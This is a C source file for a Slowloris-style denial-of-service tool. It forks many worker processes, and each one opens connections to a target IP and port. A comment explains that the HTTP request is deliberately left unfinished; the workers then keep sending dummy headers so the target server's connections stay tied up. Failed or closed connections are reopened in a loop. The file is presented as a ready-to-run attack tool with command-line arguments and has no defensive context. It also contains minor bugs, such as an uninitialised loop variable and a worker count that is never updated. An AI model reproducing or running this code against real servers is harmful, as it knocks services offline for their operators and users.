// prog.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/msg.h>
#include <string.h>
#include <signal.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <poll.h>
#include <time.h>

#define BUFFER_LEN 256
#define MSGTYPE 1
#define QID msgget(ftok("/tmp", 'z' ), IPC_CREAT | 0666 )
#define POLL_TIMEOUT_MS 200
#define WORKER_SPAWN_INTERVAL_MS 50

struct log {
    int worker_id;
    char message[BUFFER_LEN];
};

struct msgbuf {
   long mType;
   char mText[sizeof(struct log)];
};

void main_exit_handler(int sig_num) {

    printf("[main]: closing queue...\n");

    // close queue
    msgctl(QID, IPC_RMID, NULL);
}

void send_message(int id, char* message) {

    // define variables
    struct log log;
    struct msgbuf msg;

    // set message values
    log.worker_id = id;
    strcpy(log.message, message);
    msg.mType = MSGTYPE;
    memcpy(msg.mText, (char*)&log, sizeof(msg.mText));

    // send message
    msgsnd(QID, &msg, sizeof(msg.mText), 0);
}

int worker(int id, char* ip, int port, int num_connections, int interval) {

    // define variables
    int socket_fd;
    struct sockaddr_in connect_addr;
    char byte;
    int byte_index;
    int random_fd;
    char header[9];
    int header_index = 0;
    struct pollfd fds[1];
    int connected;

    // base http request
    // final newlines are left out so the request would not come to an end
    char *base_request = \
        "GET / HTTP/1.0\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "Connection: keep-alive\r\n"
        "Keep-Alive: timeout=5, max=100\r\n";
        // "\r\n\r\n";

    // prepare connection
    connect_addr.sin_family = AF_INET;
    connect_addr.sin_port = htons(port);
    inet_aton(ip, &connect_addr.sin_addr.s_addr);

    while (1) {

        send_message(id, "attempting to connect to remote host...");

        // init new socket
        socket_fd = socket(AF_INET, SOCK_STREAM, 0);

        // connect to server
        if (connect(socket_fd, (struct sockaddr*)&connect_addr, sizeof(connect_addr)) == -1) {
            send_message(id, "could not connect to remote host");
            break;
        }
        connected = 1;

        send_message(id, "connected to remote host");

        // send initial base request
        send_message(id, "sending initial headers...");
        send(socket_fd, base_request, strlen(base_request), 0);

        // set-up socket polling
        fds[0].fd = socket_fd;
        fds[0].events = POLLOUT;

        // header feeding loop
        while (connected) {

            sleep(interval);

            // poll socket
            poll(fds, 1, POLL_TIMEOUT_MS);

            // check if connection was closed
            if (fds[0].revents & POLLHUP) {

                send_message(id, "connection closed, reestablishing...");
                connected = 0;
            } else {

                // send header
                send_message(id, "sending header...");
                header_index = (header_index + 1) % 10;
                sprintf(header, "X-%d: %d\r\n", header_index, header_index);
                send(socket_fd, header, strlen(header), 0);
            }
        }

        // close previous socket
        close(socket_fd);
    }

    return 1;
}

int main(int argc, char *argv[]) {

    // define variables
    struct msgbuf msg;
    struct log log;
    struct msqid_ds ds;
    struct timespec ts;
    int msgrcv_result;
    int *worker_pids;
    int worker_pids_amt = 0;
    int pid;

    // validate args
    if (argc != 5) {
        printf("usage: %s <ip> <port> <num_connections> <interval>\n", argv[0]);
        return 1;
    }

    // allocate space for worker pids
    worker_pids = malloc( sizeof(int) * atoi(argv[3]) );

    // prepare timespec struct for worker spawn interval
    ts.tv_sec = WORKER_SPAWN_INTERVAL_MS / 1000;
    ts.tv_nsec = (WORKER_SPAWN_INTERVAL_MS % 1000) * 1000000;

    // spawn workers
    printf("[main]: spawning workers...\n");
    for (int worker_id = 0; worker_id < atoi(argv[3]); worker_id++) {

        // spawn worker process
        if ( (pid = fork()) == 0) {
            exit(worker(worker_id + 1, argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4])));
        } else {
            worker_pids[worker_id] = pid;
            printf("[main]: spawned worker %d\n", worker_id + 1);
        }

        // sleep for given interval
        nanosleep(&ts, &ts);
    }

    // graceful exit on signal
    signal(SIGINT, main_exit_handler);
    signal(SIGTERM, main_exit_handler);

    // while queue is open
    while (msgrcv_result != -1) {

        // try reading message from queue
        if ( (msgrcv_result = msgrcv(QID, &msg, sizeof(msg.mText), MSGTYPE, 0)) > 0) {

            // read log
            log = *(struct log *)msg.mText;

            // print log
            printf("[worker %d]: %s\n", log.worker_id, log.message);
        }

    }

    // terminate children
    printf("[main]: terminating workers...\n");
    for (int worker_id = 0; worker_id < worker_pids_amt; worker_id++) {
        kill(worker_pids[worker_id], 15);
    }

    printf("[main]: exiting...\n");

    return 0;

}